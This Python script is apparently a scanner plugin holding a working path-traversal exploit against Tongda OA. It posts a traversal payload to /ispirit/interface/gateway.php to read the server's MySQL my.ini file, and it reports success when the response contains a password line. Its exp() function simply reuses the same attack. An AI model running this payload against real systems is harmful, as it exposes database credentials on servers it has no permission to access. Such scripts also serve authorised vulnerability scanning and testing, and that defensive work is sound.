import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''OA TongDa Path Traversal''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://github.com/jas502n/OA-tongda-RCE"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["tongda", "lfi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/ispirit/interface/gateway.php"""
        method = "POST"
        data = """json={"url":"/general/../../mysql5/my.ini"}"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""text/html""" in str(resp0.headers)) and ("""[mysql]""" in resp0.text and """password=""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url